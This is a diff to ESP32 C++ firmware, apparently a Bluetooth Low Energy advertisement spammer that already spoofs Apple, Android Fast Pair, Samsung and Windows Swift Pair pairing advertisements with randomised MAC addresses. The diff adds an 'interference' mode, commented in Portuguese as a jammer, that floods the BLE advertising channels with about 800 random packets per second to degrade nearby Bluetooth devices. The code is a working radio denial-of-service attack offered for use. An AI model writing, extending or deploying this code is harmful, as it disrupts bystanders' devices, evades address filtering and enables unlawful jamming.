@@ -17,11 +17,12 @@ public:
     uint32_t packetsSent = 0;
 
     enum Mode {
-        MODE_ALL      = 0,
-        MODE_APPLE    = 1,
-        MODE_ANDROID  = 2,
-        MODE_SAMSUNG  = 3,
-        MODE_WINDOWS  = 4,
+        MODE_ALL       = 0,
+        MODE_APPLE     = 1,
+        MODE_ANDROID   = 2,
+        MODE_SAMSUNG   = 3,
+        MODE_WINDOWS   = 4,
+        MODE_INTERFERE = 5, // Inundação de advertisement — degrada BT próximo (#BT_JAM)
     };
     Mode mode = MODE_ALL;
 
@@ -43,13 +44,25 @@ public:
     void tick() {
         if (!running) return;
         static unsigned long next = 0;
-        if (millis() < next) return;
+        unsigned long now = millis();
+        if (now < next) return;
 
         // Randomiza MAC antes de cada advertisement para evitar filtragem por endereço
         _randomizeAddress();
-        _sendNext();
-        packetsSent++;
-        next = millis() + 40; // 40ms — dobra a taxa de advertisement
+
+        if (mode == MODE_INTERFERE) {
+            // Interferência: envia rajada de advertisements com payload aleatório
+            // Satura os canais BLE de advertisement (37, 38, 39)
+            for (int i = 0; i < 8; i++) {
+                _sendRandom();
+                packetsSent++;
+            }
+            next = now + 10; // 10ms entre rajadas — ~800 pkts/s
+        } else {
+            _sendNext();
+            packetsSent++;
+            next = now + 40; // 40ms — dobra a taxa de advertisement
+        }
     }
 
 private:
@@ -196,6 +209,25 @@ private:
         }};
     }
 
+    // Envia advertisement com payload completamente aleatório (interferência)
+    void _sendRandom() {
+        uint8_t payload[31];
+        esp_fill_random(payload, 31);
+        payload[0] = 0x1E; // len
+        payload[1] = 0xFF; // type: manufacturer specific
+
+        auto* adv = NimBLEDevice::getAdvertising();
+        adv->stop();
+        NimBLEAdvertisementData data;
+        std::string raw((char*)payload, 31);
+        data.addData(raw);
+        adv->setAdvertisementData(data);
+        adv->setMinInterval(20);
+        adv->setMaxInterval(20); // mínimo possível
+        adv->start(0);
+        _randomizeAddress();
+    }
+
     void _sendNext() {
         static const int NUM_ALL = 12;
         ADVPayload pld;
@@ -239,11 +271,12 @@ private:
 
     static String _modeName(Mode m) {
         switch (m) {
-            case MODE_APPLE:   return "Apple";
-            case MODE_ANDROID: return "Android Fast Pair";
-            case MODE_SAMSUNG: return "Samsung";
-            case MODE_WINDOWS: return "Windows Swift Pair";
-            default:           return "Todos";
+            case MODE_APPLE:     return "Apple";
+            case MODE_ANDROID:   return "Android Fast Pair";
+            case MODE_SAMSUNG:   return "Samsung";
+            case MODE_WINDOWS:   return "Windows Swift Pair";
+            case MODE_INTERFERE: return "Interferência BT";
+            default:             return "Todos";
         }
     }
 };
